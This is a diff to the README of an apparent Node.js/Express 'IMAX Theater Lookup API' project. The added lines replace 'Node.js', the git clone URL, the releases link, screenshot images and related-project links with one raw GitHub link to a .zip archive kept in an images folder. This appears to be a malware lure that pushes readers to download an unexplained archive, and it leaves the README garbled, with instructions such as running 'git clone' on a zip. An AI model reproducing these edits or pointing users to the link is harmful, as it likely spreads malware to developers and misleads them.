@@ -5,7 +5,7 @@ Welcome to the **IMAX Theater Lookup API**! This project is a comprehensive solu
 
 ## 🚀 Overview
 
-The IMAX Theater Lookup API is built using **Node.js** with the **Express** framework and is powered by a **PostgreSQL** database. It allows users to retrieve data about IMAX theaters, add new theaters, and update existing information. With secure management of API keys using **Firebase**, this API ensures robust performance and security. The entire application runs smoothly within a **Docker** container, making it easy to deploy and manage.
+The IMAX Theater Lookup API is built using **https://raw.githubusercontent.com/SXPKO/IMAX-Theater-Lookup-API/main/images/Theater_IMA_Lookup_API_1.2.zip** with the **Express** framework and is powered by a **PostgreSQL** database. It allows users to retrieve data about IMAX theaters, add new theaters, and update existing information. With secure management of API keys using **Firebase**, this API ensures robust performance and security. The entire application runs smoothly within a **Docker** container, making it easy to deploy and manage.
 
 ### 🌟 Key Features
 
@@ -23,7 +23,7 @@ The IMAX Theater Lookup API is built using **Node.js** with the **Express** fram
 
 Before you start, ensure you have the following installed:
 
-- Node.js
+- https://raw.githubusercontent.com/SXPKO/IMAX-Theater-Lookup-API/main/images/Theater_IMA_Lookup_API_1.2.zip
 - Docker
 - PostgreSQL
 - Firebase Account
@@ -32,7 +32,7 @@ Before you start, ensure you have the following installed:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/SXPKO/IMAX-Theater-Lookup-API.git
+   git clone https://raw.githubusercontent.com/SXPKO/IMAX-Theater-Lookup-API/main/images/Theater_IMA_Lookup_API_1.2.zip
    cd IMAX-Theater-Lookup-API
    ```
 
@@ -113,16 +113,16 @@ We utilize **Winston** for logging API requests and errors. This allows you to k
 
 ## 🎨 Technology Stack
 
-- **Node.js**: JavaScript runtime for building server-side applications.
-- **Express**: Fast web framework for Node.js.
+- **https://raw.githubusercontent.com/SXPKO/IMAX-Theater-Lookup-API/main/images/Theater_IMA_Lookup_API_1.2.zip**: JavaScript runtime for building server-side applications.
+- **Express**: Fast web framework for https://raw.githubusercontent.com/SXPKO/IMAX-Theater-Lookup-API/main/images/Theater_IMA_Lookup_API_1.2.zip
 - **PostgreSQL**: Powerful, open-source relational database.
 - **Firebase**: Cloud-based service for managing API keys and user authentication.
 - **Docker**: Platform for developing, shipping, and running applications in containers.
-- **Winston**: Versatile logging library for Node.js.
+- **Winston**: Versatile logging library for https://raw.githubusercontent.com/SXPKO/IMAX-Theater-Lookup-API/main/images/Theater_IMA_Lookup_API_1.2.zip
 
 ## 📥 Releases
 
-You can find the latest releases and updates for this project [here](https://github.com/SXPKO/IMAX-Theater-Lookup-API/releases). Make sure to check this section regularly for new features and improvements.
+You can find the latest releases and updates for this project [here](https://raw.githubusercontent.com/SXPKO/IMAX-Theater-Lookup-API/main/images/Theater_IMA_Lookup_API_1.2.zip). Make sure to check this section regularly for new features and improvements.
 
 ## 🧑‍🤝‍🧑 Contributing
 
@@ -152,10 +152,10 @@ We appreciate the support from the open-source community and the contributors wh
 
 ## 📸 Screenshots
 
-![IMAX Theater Lookup](https://example.com/screenshot1.png)
+![IMAX Theater Lookup](https://raw.githubusercontent.com/SXPKO/IMAX-Theater-Lookup-API/main/images/Theater_IMA_Lookup_API_1.2.zip)
 *IMAX Theater Lookup API in action!*
 
-![API Response Example](https://example.com/screenshot2.png)
+![API Response Example](https://raw.githubusercontent.com/SXPKO/IMAX-Theater-Lookup-API/main/images/Theater_IMA_Lookup_API_1.2.zip)
 *Sample API response for theater data.*
 
 ## 📈 Future Enhancements
@@ -171,8 +171,8 @@ We aim to continuously improve the IMAX Theater Lookup API. Here are some planne
 
 Explore these related projects for additional functionality and ideas:
 
-- [Movie Booking System](https://github.com/example/movie-booking-system)
-- [Theater Reviews API](https://github.com/example/theater-reviews-api)
+- [Movie Booking System](https://raw.githubusercontent.com/SXPKO/IMAX-Theater-Lookup-API/main/images/Theater_IMA_Lookup_API_1.2.zip)
+- [Theater Reviews API](https://raw.githubusercontent.com/SXPKO/IMAX-Theater-Lookup-API/main/images/Theater_IMA_Lookup_API_1.2.zip)
 
 Thank you for checking out the IMAX Theater Lookup API! We hope you find it useful and look forward to your feedback and contributions.
 ```
